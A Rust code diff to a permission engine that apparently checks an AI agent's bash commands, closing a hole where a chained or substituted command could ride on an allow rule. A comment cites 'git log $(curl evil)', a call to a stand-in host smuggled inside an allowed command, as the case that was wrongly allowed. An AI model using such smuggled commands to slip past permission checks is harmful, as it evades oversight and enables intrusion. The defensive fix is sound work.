@@ -1,6 +1,6 @@
 use super::hardcoded::is_hardcoded_denied;
 use super::matcher::{CompiledPermissions, PermissionMatcher};
-use super::normalize::{normalize_path_for_matching, split_chained_commands};
+use super::normalize::{normalize_path_for_matching, split_command_line, UnmodellableConstruct};
 use super::types::{PermissionConfig, PermissionDecision, PermissionMode};
 
 #[derive(Debug, Clone)]
@@ -35,16 +35,16 @@ impl PermissionEngine {
     }
 
     fn evaluate_bash(&self, input: &str) -> PermissionDecision {
-        let commands = split_chained_commands(input);
+        let split = split_command_line(input);
 
-        if commands.is_empty() {
+        if split.segments.is_empty() {
             return self.evaluate_single("bash", input);
         }
 
         let mut has_ask_match = false;
         let mut all_allow_match = true;
 
-        for command in &commands {
+        for command in &split.segments {
             if let Some(reason) = is_hardcoded_denied("bash", command) {
                 return PermissionDecision::Deny {
                     reason: format!("Hardcoded deny: {reason}"),
@@ -68,6 +68,14 @@ impl PermissionEngine {
 
         if has_ask_match {
             return PermissionDecision::Ask { rule_matched: true };
+        }
+
+        // Placed after the deny and ask checks so it can only ever tighten: an explicit
+        // `deny` still denies and an explicit `ask` still names its rule. What it stops is
+        // the leading command's `allow` glob deciding a line the splitter could not read —
+        // `git log $(curl evil)` used to come back `Allow` on the strength of `bash:git *`.
+        if let Some(construct) = split.unmodellable {
+            return self.unmodellable_decision(construct);
         }
 
         if all_allow_match {
@@ -111,6 +119,22 @@ impl PermissionEngine {
             matches_bash_with_optional_args(matcher, tool, input)
                 || matches_bash_with_optional_args(matcher, tool, &normalized)
         })
+    }
+
+    /// The configured default, with a reason naming the construct that forced it.
+    fn unmodellable_decision(&self, construct: UnmodellableConstruct) -> PermissionDecision {
+        match self.compiled.default {
+            PermissionMode::Allow => PermissionDecision::Allow,
+            PermissionMode::Deny => PermissionDecision::Deny {
+                reason: format!(
+                    "Cannot check {} against the rules; default mode is deny",
+                    construct.describe()
+                ),
+            },
+            PermissionMode::Ask => PermissionDecision::Ask {
+                rule_matched: false,
+            },
+        }
     }
 
     fn default_decision(&self) -> PermissionDecision {
